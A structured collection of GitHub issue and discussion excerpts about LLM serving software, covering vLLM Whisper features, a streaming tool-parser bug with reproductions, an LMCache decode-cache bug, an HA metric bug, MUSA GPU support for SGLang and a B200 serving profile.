### 🚀 The feature, motivation and pitch

This issue is for keeping track of the recurrent Whisper asks as well as the linked on-going efforts to support that feature, if any. 
When a feature request has no linked PR, feel free to claim the work here if you want to help!

- [ ] Support different `response_formats` https://platform.openai.com/docs/api-reference/audio/createTranscription
   - Related issues: https://github.com/vllm-project/vllm/issues/19556, https://github.com/vllm-project/vllm/issues/14818, https://github.com/vllm-project/vllm/issues/24302 
   - PR(s): https://github.com/vllm-project/vllm/pull/24209 (`verbose_json`, **help needed with other formats**)
- [ ] Support timestamp granularities:  
  - Context: Very much related to the above. Unfortunately outputting by `word` requires aligning encoder latents  (usually extrapolated from the crossattn layers) with decoder ones. I feel a lot of these whsper-specific techniques bring in added complexity to vLLM. However, I think we're open to exploring in this direction if we can come up with a less invasive solutions. Some references to get started https://github.com/m-bain/whisperX https://github.com/openai/whisper/discussions/684  .
  - https://github.com/vllm-project/vllm/pull/24209 *partially* addresses this issue by letting whisper predict the segments through timestamp tokens.
- [x] Automatic language detection:
  - Context: one should be able to let the decoder predict part of its "preamble" prompt, **including the language and task token, conditioned on the encoder output**. This is effectively utilizing whisper "built-in automatic language detection" feature. Mind that it would be ideal to _guide_ the output tokens among valid languages. Accuracy to evaluate.
  - Related issues: https://github.com/vllm-project/vllm/issues/14174
  - PR: https://github.com/vllm-project/vllm/pull/34342
  - [ ] Follow-up: Optimize performance to avoid encoding the audio twice eg leveraging MM cache and/or submitting the request in a single `.generate` call

  - [ ] @alex-jw-brooks to propose an approach  
- [x] Beam search:
  - PR(s): https://github.com/vllm-project/vllm/pull/13758 , this one needs reviving. Feel free to claim work here. 
  - PR(s) : https://github.com/vllm-project/vllm/pull/36153 https://github.com/vllm-project/vllm/pull/36160
- [ ] Feed previous chunk context to improve accuracy
  - PR(s): https://github.com/vllm-project/vllm/pull/20249 (first tentative, to re-do)

  - PR(s): https://github.com/vllm-project/vllm/pull/34628

   - Context: Current Whisper/ASR model served with vLLM in production necessitate of a better pre-processing to avoid hallucinations cause by running ASR on background noise chunks. While building a pipeline around vLLM is a popular option, adding a lightweight VAD model should make the out-of-the-box experience of using ASR endpoints in vLLM much better.

items.title: [Bug]: DeepSeek-V3/V3.1 tool parser drops the tool call when start+end tokens land in the same streaming delta
items.author: ErenAta16
items.body_excerpt:
### Your current environment

<details>
<summary>Environment (CPU-only, no GPU needed to reproduce)</summary>

```text
vllm version   : 0.24.0
transformers   : (deepseek-ai/DeepSeek-V3 tokenizer loaded via AutoTokenizer)
torch          : 2.12.1+cpu
Python         : 3.10.12 (Linux)
CUDA           : not applicable, this is a pure tool-parser bug
```

</details>

###  Describe the bug

`DeepSeekV3ToolParser.extract_tool_calls_streaming` (and the near-identical `DeepSeekV31ToolParser`) silently drops a tool call whenever its start and end tokens (`<｜tool▁call▁begin｜>` / `<｜tool▁call▁end｜>`) land in the same streaming delta, instead of one token at a time.

The state machine branches purely on comparing start/end token counts between `previous_token_ids` and `current_token_ids`:

```python
# case -- we're starting a new tool call
if cur_tool_start_count > cur_tool_end_count and cur_tool_start_count > prev_tool_start_count:
    ...
# case -- the current tool call is being closed.
elif cur_tool_start_count == cur_tool_end_count and cur_tool_end_count >= prev_tool_end_count:
    if self.prev_tool_call_arr is None or len(self.prev_tool_call_arr) == 0:
        logger.debug("attempting to close tool call, but no tool call")
        return None
```
(`vllm/tool_parsers/deepseekv3_tool_parser.py`, around line 178 and line 208; same shape in `deepseekv31_tool_parser.py`.)

This assumes a tool call always spends at least one delta with `start_count > end_count` (i.e., the opening tag is observed strictly before the closing tag in a *separate* call). When a single delta instead contains a *complete* tool call — start tag, name, arguments, and end tag all at once — `cur_tool_start_count` and `cur_tool_end_count` become equal in the very first call for that tool. The code takes the "closing" branch, finds `prev_tool_call_arr` empty (nothing was ever opened), logs `"attempting to close tool call, but no tool call"`, and returns `None`. The tool call is gone — not delayed, not merged into the next delta, just dropped. `extract_tool_calls` (non-streaming) parses the exact same text correctly, so this is a streaming-only regression relative to the final output.

This isn't an exotic corner case: any time a chunk boundary batches more than one token together — a short function name/arguments, `--stream-interval > 1`, or plain scheduler batching under load — the whole call can arrive in one delta.

This is the same failure mode already fixed for DeepSeek-V3.2 in #36056 ("[Bugfix] Fix Deepseekv32 tool parser when stream interval > 1"), which replaced V3.2's incremental character-by-character state machine with a buffer-until-complete-block strategy specifically because "with stream_interval > 1, multiple parameters or closing tags can arrive in a single delta, causing the state machine to skip parameters and silently drop arguments." `deepseekv3_tool_parser.py` and `deepseekv31_tool_parser.py` still use the old per-token-assumption approach and hit the identical problem — they just never got the same fix.

### Reproduction (no GPU, real vLLM + real DeepSeek-V3 tokenizer)

```python
from transformers import AutoTokenizer
from vllm.tool_parsers.deepseekv3_tool_parser import DeepSeekV3ToolParser

tok = AutoTokenizer.from_pretrained("deepseek-ai/DeepSeek-V3", trust_remote_code=True)

text = (
    '<｜tool▁calls▁begin｜>'
    '<｜tool▁call▁begin｜>function<｜tool▁sep｜>get_weather\n'
    '```json\n{"x": 42}\n```<｜tool▁call▁end｜>'
    '<｜tool▁calls▁end｜>'
)

# Non-streaming: parses correctly.
final = DeepSeekV3ToolParser(tok).extract_tool_calls(text, None)
print("final:", [(c.function.name, c.function.arguments) for c in final.tool_calls])
# final: [('get_weather', '{"x": 42}')]

# Streaming: the whole tool call arrives in a single delta.
token_ids = tok.encode(text, add_special_tokens=False)
dm = DeepSeekV3ToolParser(tok).extract_tool_calls_streaming(
    previous_text="", current_text=text, delta_text=text,
    previous_token_ids=[], current_token_ids=token_ids, delta_token_ids=token_ids,
    request=None,
)
print("streamed:", dm)
# streamed: None   <-- tool call silently dropped
```

Swapping in `DeepSeekV31ToolParser` with the V3.1-style delimiter format (`<｜tool▁sep｜>` without the ```` ```json ```` fence) reproduces the same `None`.

Character-by-character streaming (feeding the text one character at a time, as most real single-token deltas would) does *not* trigger this — it's specifically the "start and end both show up before the parser ever sees a start-only state" case that's mishandled.

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

comments.author: ErenAta16
comments.body:
Same root cause shows up in a third, unrelated parser: `FunctionGemmaToolParser` (`vllm/tool_parsers/functiongemma_tool_parser.py`).

Its streaming state machine branches on `start_count`/`end_count`/`prev_start_count`/`prev_end_count` computed from plain substring counts on `current_text`/`previous_text` (not token ids, but the same idea):

```python
if start_count > prev_start_count and start_count > end_count:
    # starts a new call, appends placeholders, returns None
if start_count > end_count:
    # mid-call
if end_count > prev_end_count:
    # call just ended
```

If a delta contains a complete call (start and end tag together), `start_count` and `end_count` become equal in the same step, so neither the "starting" branch nor the "mid-call" branch fires. Only the "just ended" branch fires, and it guards on `self.current_tool_id >= 0`, which is still `-1` because the call was never opened. Nothing gets appended, no delta is emitted, and no error is raised.

Confirmed against the real class, no stubbing:

```python
from vllm.tool_parsers.functiongemma_tool_parser import FunctionGemmaToolParser

text = "<start_function_call>call:get_weather{location:<escape>Paris<escape>}<end_function_call>"

final = FunctionGemmaToolParser(tokenizer=None).extract_tool_calls(text, None)
print([(c.function.name, c.function.arguments) for c in final.tool_calls])
# [('get_weather', '{"location": "Paris"}')]

dm = FunctionGemmaToolParser(tokenizer=None).extract_tool_calls_streaming(
    previous_text="", current_text=text, delta_text=text,
    previous_token_ids=[], current_token_ids=[], delta_token_ids=[],
    request=None,
)
print(dm)
# None
```

Character-by-character streaming works fine for it too, same as the DeepSeek parsers above. Given this is now three independent implementations hitting the identical assumption (a call always spends at least one delta in a "started but not finished" state before the parser sees it), it might be worth treating as one systemic gap rather than three one-off patches, similar to how #36056 replaced DeepSeek-V3.2's incremental approach with a buffer-until-complete-block strategy. Happy to help however is useful, just flagging what I found.

comments.author: ErenAta16
comments.body:
Fourth instance of the same symptom class, different mechanism this time: `Internlm2ToolParser` (`vllm/tool_parsers/internlm2_tool_parser.py`).

Here the bug isn't a count comparison, it's that sending the function name and sending the arguments are structured as two separate streaming calls by design:

```python
if not self.current_tool_name_sent:
    function_name = tool_call_arr.get("name")
    if function_name:
        ...
        delta = DeltaMessage(tool_calls=[DeltaToolCall(
            function=DeltaFunctionCall(name=function_name).model_dump(exclude_none=True)
        )])
        self.current_tool_name_sent = True
        self.streamed_args_for_tool.append("")
    else:
        delta = None
else:
    # arguments are only ever computed/sent from here
    ...
```

The first time `extract_tool_calls_streaming` sees a parseable name, it returns immediately with just the name and flips `current_tool_name_sent = True`. Arguments are only ever read and sent on a *later* call, once that flag is already set. If the entire tool call (name and arguments together) arrives in one streaming delta, there is no later call: the method sends the name once and nothing else, and the arguments are gone for good, not deferred.

```python
from vllm.tool_parsers.internlm2_tool_parser import Internlm2ToolParser

text = '<|action_start|><|plugin|>{"name": "get_weather", "parameters": {"x": 42}}<|action_end|>'

final = Internlm2ToolParser(tokenizer=None).extract_tool_calls(text, None)
print([(c.function.name, c.function.arguments) for c in final.tool_calls])
# [('get_weather', '{"x": 42}')]

dm = Internlm2ToolParser(tokenizer=None).extract_tool_calls_streaming(
    previous_text="", current_text=text, delta_text=text,
    previous_token_ids=[], current_token_ids=[], delta_token_ids=[],
    request=None,
)
print(dm)
# tool_calls=[DeltaToolCall(..., function=DeltaFunctionCall(name='get_weather', arguments=None))]
# arguments never sent, and there is no follow-up call coming since this is the whole message.
```

I'll stop adding parsers here rather than turn this into a survey of the whole directory, but between this, the two DeepSeek parsers, and FunctionGemma, it does look like "assume the client gets at least two calls per tool call" is a recurring, implicit assumption across several of the hand-rolled (non buffer-until-complete) parsers, which a single well-timed delta can violate.

comments.author: PyContriver
comments.body: @ErenAta16 will take a loot into this issue and see if I can fix it!

comments.author: ErenAta16
comments.body:
Sounds good, thanks for picking this up.

Quick orientation since this thread now covers four parsers rather than just the original DeepSeek-V3/V3.1 report: the same underlying assumption (that a tool call's opening and closing markers arrive in separate streaming deltas, never together) also breaks `FunctionGemmaToolParser` and `Internlm2ToolParser`, though each hits it through a different mechanism:

- `deepseekv3_tool_parser.py` / `deepseekv31_tool_parser.py`: token-count comparison between `previous_token_ids` and `current_token_ids` never sees a state where start_count > end_count, so it goes straight to the "closing" branch with no call ever opened.
- `functiongemma_tool_parser.py`: same idea but on substring counts (`start_count`/`end_count`) instead of token ids.
- `internlm2_tool_parser.py`: different mechanism entirely — the function name and the arguments are hard-coded to be sent as two separate streaming calls, so if the whole tool call shows up in one delta, the name is sent but `arguments` stays `None` since there's no second call to fill it in.

If you're starting with DeepSeek-V3, the merged PR #36056 fixed the identical symptom in a different parser and is a reasonable reference for the shape of the fix (tracking whether a call was actually opened, rather than inferring it from a count comparison that assumes multi-delta arrival).

Happy to verify against a real vLLM install once you have something up, the way I did for #48022. Let me know if it'd help to split this into one PR per parser or handle it together, given they're independent code paths that happen to share the same bug class.

comments.author: redd34
comments.body:
This still reproduces on v0.30.0 and on main @ 3b4566c, for both `deepseek_v3` and `deepseek_v31`. I applied #48636 on top of main and it fixes the whole-call-in-one-delta case. One neighbouring split still loses the arguments with #48636 applied: the name arrives in one delta, then the complete argument JSON arrives in the same delta as `<｜tool▁call▁end｜>`. The call is then emitted with `arguments=''`. #48343 (V3) and #58806 (V3.1) do not change this either; I tried each of them on main.

```python
from vllm.entrypoints.openai.chat_completion.protocol import ChatCompletionRequest
from vllm.tokenizers import get_tokenizer
from vllm.tool_parsers.deepseekv3_tool_parser import DeepSeekV3ToolParser

tok = get_tokenizer("deepseek-ai/DeepSeek-V3-0324", revision="e9b33add76883f293d6bf61f6bd89b497e80e335")
req = ChatCompletionRequest(model="m", messages=[{"role": "user", "content": "hi"}])

def stream(deltas):
    p = DeepSeekV3ToolParser(tok)
    prev_text, prev_ids, calls = "", [], {}
    for delta in deltas:
        ids = tok.encode(delta, add_special_tokens=False)
        cur_text, cur_ids = prev_text + delta, prev_ids + ids
        d = p.extract_tool_calls_streaming(prev_text, cur_text, delta, prev_ids, cur_ids, ids, req)
        for tc in (d.tool_calls if d else []):
            c = calls.setdefault(tc.index, ["", ""])
            c[0] += (tc.function.name or "") if tc.function else ""
            c[1] += (tc.function.arguments or "") if tc.function else ""
        prev_text, prev_ids = cur_text, cur_ids
    return [tuple(c) for c in calls.values()]

head = "<｜tool▁calls▁begin｜><｜tool▁call▁begin｜>function<｜tool▁sep｜>get_weather\n```json\n"
args = '{"city": "Paris"}\n```'
tail = "<｜tool▁call▁end｜><｜tool▁calls▁end｜>"
print("non-streaming       :", [(t.function.name, t.function.arguments)
      for t in DeepSeekV3ToolParser(tok).extract_tool_calls(head + args + tail, req).tool_calls])
print("A [head+args+tail]  :", stream([head + args + tail]))
print("B [head, args+tail] :", stream([head, args + tail]))
print("C [head, args, tail]:", stream([head, args, tail]))
```

```text
                      v0.30.0 / main 3b4566c           main + #48636
non-streaming       : get_weather {"city": "Paris"}    same
A [head+args+tail]  : []                               get_weather {"city": "Paris"}
B [head, args+tail] : get_weather ''                   get_weather ''
C [head, args, tail]: get_weather {"city": "Paris"}    same
```

`deepseek_v31` behaves the same way (`get_weather<｜tool▁sep｜>` as `head`, `{"city": "Paris"}` as `args`). Split B is not an exotic case: with `stream_interval > 1` or speculative decoding, a short argument object and its end token easily arrive together. In our replay of template-rendered DeepSeek-V3-0324 and V3.1 outputs through the serving `parse_delta` path, a seeded split into random groups of 1 to 8 tokens still loses or truncates the arguments on 7 of 23 well-formed fixtures with #48636 applied. One example is [`deepseek/v3-text-before-call`](https://github.com/redd34/canitoolcall/blob/d27dceba4fdbef4981f0144eb0ae2e1766d5ffc3/fixtures/deepseek/v3.jsonl#L4). There, the name arrives in one delta, and `{"city": "London"}` arrives together with `<｜tool▁call▁end｜>` in the next (split B).

(Found with an automated conformance harness. This comment was drafted with AI assistance, and I verified the repro by running it.)

Found by canitoolcall (https://github.com/redd34/canitoolcall), an offline conformance suite for tool-call parsers.

items.title: [Feature]: Shared per choice `ChatStreamProcessor` for chat serving and streaming derender
items.author: hickeyma
items.body_excerpt:
### 🚀 The feature, motivation and pitch

Tracking issue for a follow up from the #50550 review, where @sagearc asked whether streaming chat derender could use a shared `ChatStreamProcessor` (https://github.com/vllm-project/vllm/pull/50550#discussion_r3913908193).

#### Why

After #50550, streaming chat derender (`OnlineDerenderer._derender_chat_stream_parsed`) produces the same `reasoning` / `content` / `tool_calls` deltas that `/v1/chat/completions` streams for the same tokens. To do that it repeats the per choice post parse steps from `OpenAIServingChat.chat_completion_stream_generator`:

- building the parser (`parser_cls(tokenizer, tools, chat_template_kwargs=..., model_config=...)`)
- one `parse_delta` call per chunk
- tracking `tools_streamed`
- rewriting `finish_reason` to `tool_calls` unless a function was named in `tool_choice`
- `maybe_filter_parallel_tool_calls`

The two copies match today. Only code review keeps them that way until the streaming parity tests from #47161 PR3 land and any change to parser handling has to be made in both places. Streaming logprobs on the parsed derender path (after #55029) will add another shared rule drop: logprobs and token IDs when reasoning is hidden (`hide_stream_metadata` in serving).

#### Proposal

Pull a per choice processor out of `chat_completion_stream_generator`. It owns the parser and `tools_streamed` and handles one chunk per step: `parse_delta` → `finish_reason` → parallel tool call filter.

- **Chat serving** uses it for live output. The generator keeps what only serving needs:
  - skipping `None` deltas (unless it's the finish chunk or `return_token_ids` is set)
  - reasoning token counts for usage
  - delta logging
  - error finish reasons
  - `stop_reason` and `token_ids` on the chunk
- **Streaming derender** uses it for both replay and the current chunk. The derenderer keeps what only derender needs:
  - the replay loop over `output_chunk_lens`
  - tool call ID pinning via `last_tool_call_ids`
  - always returning a chunk
  - reading and returning `stream_state`

Responses API streaming stays out. It also calls `parse_delta` but emits a different event shape.

The shared part is thin, so getting the interface right matters more than how much code moves. For chat serving this is a pure refactor with no change to what `/v1/chat/completions` streams. ChatStreamProcessor` is the name from the review and it can change.

#### Sequencing

This should come after #50550 and streaming logprobs (#55029, then the parsed path), so the processor is shaped around both users as they end up. The chat streaming change can then be reviewed on its own. If this lands before the parser cache (#57571), the cache could hold this processor instead of a bare `Parser`.

#### Done when

- [ ] Processor extracted from `chat_completion_stream_generator`. Existing chat streaming and reasoning / tool parser tests pass unchanged.
- [ ] Streaming chat derender moved onto it. `test_derender_stream.py` passes unchanged.
- [ ] The hidden reasoning rule for logprobs and token IDs lives in the processor, so the parsed derender path applies it too.

### Alternatives

- **Do it before #50550 merges as a small PR that #50550 rebases on.** I proposed this in the review (https://github.com/vllm-project/vllm/pull/50550#discussion_r4005719757), then switched to a follow up (https://github.com/vllm-project/vllm/pull/50550#discussion_r4035126957). The code around the shared steps differs enough that it's easier to shape the processor once derender streaming and #55029 are in.
- **Keep the two copies.** Cheapest option. The streaming parity tests from #47161 PR3 would catch drift after the fact but every parser handling change would still have to be made twice.
- **Include the Responses API loop.** It emits a different event shape, so it's a bigger change for little gain.

### Additional context

- RFC #47161 (streaming derender), PR #50550
- #50550 review thread: https://github.com/vllm-project/vllm/pull/50550#discussion_r3913908193
- #55029: streaming logprobs for derender
- Parser cache / server side parser state: #57571

cc @sagearc @chaunceyjiang

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: MP mode (LMCacheMPConnector) ignores save_decode_cache and stores decode KV, causing unbounded L1/L2 writes and premature eviction
items.author: ShreyasBaasri07
items.body_excerpt:
**Label**
LMCache Onboarding (#1882) · MP mode · bug

**Summary**
In MP mode, the vLLM-side LMCacheMPConnector stores every full chunk of prompt + generated tokens with no save_decode_cache gate and no cap at the prompt length. The chunk that straddles the prompt→output boundary is completed during decode by sampled (non-deterministic) output tokens, so it hashes differently on every request. The result is a brand-new KV chunk stored per request even when the prompt set is fixed and fully cached — so the cache keeps writing after warmup, L1 fills and evicts, and shared L2 (e.g. S3) fills up. The documented save_decode_cache=false (which is the default) is honored by the in-process LMCacheConnectorV1 but not by LMCacheMPConnector.

**Details**
- The store decision runs in vLLM's vendored connector vllm/distributed/kv_transfer/kv_connector/v1/lmcache_mp_connector.py (factory maps "LMCacheMPConnector" here; no kv_connector_module_path is needed to trigger it). The editable lmcache_mp_connector.py is not the code that runs.
- Offending logic in LMCacheMPRequestMetadata.GetStoreMetadata:
_computed_blocks = tracker.num_scheduled_tokens // vllm_block_size + max(
    tracker.num_vllm_hit_blocks, tracker.num_lmcache_hit_blocks)
min_available_blocks = min(len(tracker.block_hashes),
                           len(tracker.allocated_block_ids), computed_blocks)
num_staging_blocks = min_available_blocks - tracker.num_stored_blocks
num_chunks = num_staging_blocks // blocks_in_chunk     # stores EVERY full chunk
token_ids = list(tracker.all_token_ids)                # includes generated tokens_
- Trigger condition: with r = templated_prompt_len mod chunk_size, a decode chunk is written whenever r + OSL >= chunk_size; the number stored per request is floor((r + OSL) / chunk_size). For Llama-3.1 chat (template overhead ≈ 34 tokens) with chunk_size=256, OSL=250 writes 1 unique chunk/request; OSL=100 writes 0.
- lmcache.skip_save per-request (kv_transfer_params) does not help: it is not honored by the MP connector (the MP config docs explicitly warn against relying on it), and even where honored it disables all saving (prefill too).
- Versions checked: reproduced on vllm==0.26.0; source of the latest release v0.29.0 is identical (same GetStoreMetadata, no gate) — so it is not fixed upstream.

**Steps / Reproduction (if applicable)**
- Start an MP server: lmcache server --host 0.0.0.0 --port 6555 --chunk-size 256 --l1-size-gb 60 --eviction-policy LRU --eviction-trigger-watermark 1.0.
- Start vLLM with --kv-transfer-config '{"kv_connector":"LMCacheMPConnector","kv_role":"kv_both","kv_connector_extra_config":{"lmcache.mp.server_urls":["tcp://localhost:6555"]}}' (Llama-3.1-8B-Instruct).
- Replay a fixed set of prompts (e.g. aiperf ... --random-seed 42 --num-dataset-entries 50 --endpoint-type chat --isl 8192 --isl-stddev 0 --osl 250 --extra-inputs '{"ignore_eos": true, "min_tokens": 250}') so the working set fits in L1 and no eviction should occur.
- Observe: after the first pass the server keeps logging Stored 256 tokens at ~request rate, L1 memory usage 1.00 above watermark … triggering eviction fires, and external prefix-cache hit rate plateaus below 100%. With --osl 100 (so r+OSL < 256) the writes stop after the first pass and no eviction occurs — confirming the boundary/decode-chunk mechanism.

**Expected Outcome / Goal**
With save_decode_cache=false (the default), MP mode should not store decode KV. A fully-cached, replayed prompt set should be reads-only after the first pass regardless of OSL — no per-request stores, no eviction. save_decode_cache should be honored in MP mode (or the MP connector should cap stores at the prompt length by default)

**Actual Outcome (if applicable)**
MP mode stores the decode/boundary chunk on every request (unbounded, unique writes), fills L1 and shared L2, and triggers eviction even when the unique working set easily fits — because the MP connector stores all full chunks of prompt + generated tokens and ignores save_decode_cache.

items.title: [Bug]: HA snapshot recovery does not update applied sequence metric
items.author: Icedcoco
items.body_excerpt:
### Bug Report

### Summary

When an HA standby starts from a batch OpLog snapshot, the snapshot state and recovery cursor are restored successfully, but the exported `ha_oplog_applied_sequence_id` metric remains at its initial value. This makes the metric disagree with the standby's actual recovery position.

### Reproduction

The issue is reproducible with a snapshot whose recovered sequence is `117` and which has no incremental OpLog entries to apply after the snapshot:

1. Create and publish a valid batch OpLog snapshot covering sequence `117`.
2. Start an HA standby with snapshot bootstrap enabled.
3. Allow snapshot recovery to complete and the standby to enter `WATCHING`.
4. Read the standby metrics and synchronization status.

Observed result:

```text
recovery log:          snapshot/applied = 117
OpLogApplier expected:  118
snapshot applied batch: 51
standby state:          WATCHING
sync status applied:    117
ha_oplog_applied_sequence_id: 0
```

The standby's internal cursor and synchronization status show that sequence `117` has been recovered, while the exported applied-sequence gauge still reports `0`.

### Root cause

`OpLogApplier::Recover(last_applied_sequence_id)` updates only `expected_sequence_id` to `last_applied_sequence_id + 1`. It does not update the HA applied-sequence gauge.

The gauge is currently updated when an individual `ApplyOpLogEntry` succeeds. The snapshot bootstrap path installs the recovered baseline through `HotStandbyService::LoadBatchOpLogSnapshotBaselineLocked` and updates the standby's internal `applied_seq_id_`, but does not update `ha_oplog_applied_sequence_id`. Therefore, a snapshot with an empty incremental tail leaves the exported gauge at its initial value.

### Impact

- Monitoring reports an incorrect applied sequence immediately after snapshot recovery.
- Any alert, readiness check, or recovery validation based on `ha_oplog_applied_sequence_id` or derived lag can report a false failure or an incorrect recovery state.
- Operators cannot distinguish a metric reporting error from an actual OpLog replay failure using the exported metrics alone.

This is an observability and recovery-validation defect. The current evidence does not indicate data loss or incorrect recovered object metadata; the internal recovery cursor is correct.

### Expected behavior

After a successful snapshot recovery, `ha_oplog_applied_sequence_id` must equal the latest sequence represented by the recovered baseline, even when no incremental OpLog entries follow it:

```text
snapshot_applied_sequence = 117
ha_oplog_applied_sequence_id = 117
expected_sequence_id = 118
```

When incremental entries are subsequently applied, the metric must continue advancing to the latest successfully applied sequence.

### Scope of the fix

Synchronize the applied-sequence gauge with the recovered baseline during snapshot/bootstrap installation. Check all recovery paths that establish a baseline, including batch snapshot recovery, ordinary snapshot recovery, and local warm restart, so that the metric does not depend on at least one later OpLog entry being replayed.

Do not change the recovered cursor or treat the metric as the source of truth; the metric should reflect the already recovered cursor.

### Acceptance criteria

Add regression coverage for:

1. Snapshot recovery with no incremental OpLog tail.
2. Snapshot recovery followed by incremental entries.
3. A baseline at sequence `0`.
4. Consistency between the applied sequence, expected sequence, snapshot batch, and lag metrics.

The tests should verify both the internal synchronization status and the exported `ha_oplog_applied_sequence_id` metric.

### Additional context

The metric is defined as the "Latest OpLog sequence ID applied by Standby". A successful snapshot recovery already reports the recovered sequence in recovery logs and synchronization status, so the exported metric should expose the same value rather than remain at its process-start default.

items.title: [Roadmap][Feature] Support Moore Threads (MUSA) GPU
items.author: yeahdongcn
items.body_excerpt:
### Checklist

- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

## Motivation

Add first-class support for [Moore Threads](https://en.mthreads.com/) (**MUSA**) GPUs in **SGLang** (including `sglang`, `sgl-kernel`, and `multimodal_gen`), enabling SGLang to run efficiently and be optimized on MTGPU hardware while minimizing disruption to existing vendor backends and preserving upstream compatibility.

## Background

[Moore Threads](https://en.mthreads.com/) **MUSA** (Meta-computing Unified System Architecture) SDK provides a CUDA-compatible execution environment together with a vendor-specific runtime and software ecosystem. This design allows many CUDA-based projects to be ported to MUSA with limited source-level changes, while still enabling vendor-specific optimizations where necessary.

The proposed integration follows a **vendor-isolated branching model**, conceptually similar to how AMD integrates ROCm support into CUDA-centric projects. This comparison is made to clarify the architectural approach and does not imply any upstream NVIDIA-specific changes or dependencies.

By explicitly isolating MUSA-specific logic while preserving CUDA fallback paths, this approach aims to maintain upstream compatibility, minimize code churn, and keep vendor-specific optimizations well-scoped and maintainable.

### Why add MUSA support to SGLang

- Enable SGLang users to run models end-to-end on MTGPU.
- Preserve a single codebase that falls back to existing CUDA implementations.
- Provide targeted MUSA-optimized kernels for operators where performance is essential.

### Related MooreThreads repos referenced in this effort

- [torch_musa](https://github.com/MooreThreads/torch_musa): PyTorch extension for MTGPU.
- [mate](https://github.com/MooreThreads/mate): MUSA AI Tensor Engine, providing high-performance kernels and APIs compatible with FlashAttention / FlashInfer–style interfaces.
- [torchada](https://github.com/MooreThreads/torchada): A lightweight adapter layer that enables CUDA-style PyTorch extensions (`CUDAExtension`, build flags, etc.) to be reused on MUSA with minimal modification.
- [mthreads-ml-py](https://github.com/MooreThreads/mthreads-ml-py): Python bindings for MTML, providing GPU discovery, monitoring, and management capabilities. Functionally similar to `pynvml` for NVIDIA platforms.

## High-level approach

- Progressive vendor-branching: Add explicit `is_musa` device detection and `forward_musa` dispatch paths in Python layers. Default to existing CUDA paths as fallback so upstream compatibility is preserved.
- Compile-time adaptation for kernels: Use `torchada` and `setup_musa.py` to adapt build flags and extension metadata to compile existing CUDA extensions for MUSA where possible. Keep the original CUDA kernels as reference.
- Targeted MUSA optimizations: For performance-critical ops, implement MUSA-specific optimized kernels (fused kernels, different tiling, different intrinsics). Only change vendor-specific code paths; keep fallback implementations intact.
- CI & packaging: Add Dockerfiles and CI matrix entries for a MUSA-enabled build (or for cross-compilation steps), plus ops tests and model-level smoke tests.

```mermaid
flowchart TB

subgraph musa_libs [MUSA Optimized Libraries]
    deepgemm[DeepGEMM]
    flash_attn_3[Flash Attention 3]
    mt_deepep[MT-DeepEP]
    mate[MATE - MUSA AI Tensor Engine]

    mate --> deepgemm
    mate --> flash_attn_3
end

subgraph sglang_stack [SGLang]
    sglang[sglang]
    srt[srt]
    custom_op[MultiPlatformOp]
    models
    multimodal_gen

    forward[forward]
    forward_musa[forward_musa]
    forward_cuda[forward_cuda]

    attention_backend[Attention Backend]
    fa3_backend[FA3 - MATE]
    triton[Triton]
    torch_native[Torch.SDPA - Torch MUSA]

    deepseek[DeepSeek]
    layer_impl[layer_impl - is_musa customization]
    others[Others]

    musa_platform[MusaPlatform]
    fa3_platform[FA3 - MATE]
    torch_sdpa[Torch.SDPA - Torch MUSA]

    sglang_kernel[sglang_kernel]
    setup_musa[setup_musa.py]
    musa_ext[MUSA extension]
    musa_ops[MUSA kernels]
    cuda_ops[CUDA kernels - ported]
    fused_ops[fused kernels - e.g. silu_and_mul]
    misc_ops[allreduce / elementwise / kvcache]

    sglang --> srt
    srt --> custom_op
    srt --> models

    custom_op --> forward
    forward --> forward_musa
    forward_musa --> forward_cuda

    srt --> attention_backend
    attention_backend --> fa3_backend
    attention_backend --> triton
    attention_backend --> torch_native

    models --> deepseek
    deepseek --> layer_impl
    models --> others

    sglang --> multimodal_gen
    multimodal_gen --> musa_platform
    musa_platform --> fa3_platform
    musa_platform --> torch_sdpa

    sglang_kernel --> setup_musa
    setup_musa --> musa_ext

    musa_ext --> musa_ops
    musa_ext --> cuda_ops

    musa_ops --> fused_ops
    cuda_ops --> misc_ops
end
```

## Representative examples

### 1) sgl-kernel: build-time adaptation (example `setup_musa.py`)

```py
# Example: minimal change to compile as a MUSA extension via torchada wrappers
import torchada  # noqa: F401
from torch.utils.cpp_extension import BuildExtension, CUDAExtension

ext_modules = [
    CUDAExtension(
        name="sgl_kernel.common_ops",
        sources=sources,
        include_dirs=include_dirs,
        extra_compile_args={
            "mcc": mcc_flags,
            "cxx": cxx_flags,
        },
        libraries=libraries,
        extra_link_args=extra_link_args,
        py_limited_api=False,
    ),
]
```

### 2) MUSA-optimized fused op

```c
// Example C++ signature for a musa-optimized fused op
void musa_fused_add_rms_norm(
    torch::Tensor &input,
    torch::Tensor &residual,
    torch::Tensor &weight,
    double epsilon);
```

items.title: GLM-5.3-Flash on 8x B200: dual TP4/EP4 serving profile with long-context measurements
items.author: stewtong
items.body_excerpt:
<!-- register: GitHub Discussion | reader: SGLang maintainers and operators | consumed: repository thread -->

I measured an SGLang serving profile for `zai-org/GLM-5.3-Flash` on one 8x NVIDIA B200 node. It uses two independent TP4/EP4 replicas, FP8 KV cache, TRT-LLM DSA backends, the FlashInfer TRT-LLM MoE runner, static NEXTN 5-1-6, and session-affine routing.

**Update, September 27:** on the pinned image, one server prefilling two 1M-token prompts together ran out of GPU memory in the sparse-attention indexer. [#40854](https://github.com/sgl-project/sglang/pull/40854) fixes this upstream, and the repository now publishes an equivalent local patch. The results below predate the patch. The September run's findings are in [this comment](https://github.com/sgl-project/sglang/discussions/37153#discussioncomment-18627772).

The pinned software stack, engine commands, proxy configuration, client setup, methods, and results are documented here: https://github.com/stewtong/b200-glm53

Validation observations:

- All 138 streaming Chat Completions requests returned HTTP 200 with the requested completion length. None timed out or returned HTTP 429.
- At concurrency 1, median end-to-end output rate including prefill was 245.3 tok/s at about 131K input tokens and 12.50 tok/s at about 1M input tokens.
- At about 524K input tokens and total concurrency 16 across both replicas, 48/48 requests completed without an observed out-of-memory error. Maximum capacity remains unmeasured.
